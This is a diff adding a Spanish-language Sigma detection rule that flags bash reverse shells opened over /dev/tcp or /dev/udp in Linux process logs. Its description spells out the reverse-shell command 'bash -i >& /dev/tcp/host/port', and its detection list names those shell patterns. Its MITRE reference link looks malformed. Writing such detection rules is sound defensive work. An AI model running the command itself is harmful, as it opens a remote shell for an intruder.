@@ -1,0 +1,25 @@
+title: Shell inversa (bash /dev/tcp)
+id: 4a71dfc8-7e6a-5a63-8946-c8a844833cbe
+status: experimental
+description: 'Patron de reverse shell: bash -i >& /dev/tcp/host/port.'
+references:
+- https://attack.mitre.org/techniques/004
+author: C. Villalba
+date: 2026/07/16
+tags:
+- attack.execution
+- attack.t1059.004
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection:
+    CommandLine|contains:
+    - /dev/tcp/
+    - /dev/udp/
+    - bash -i
+    - sh -i
+  condition: selection
+falsepositives:
+- Diagnostico de red muy puntual
+level: high
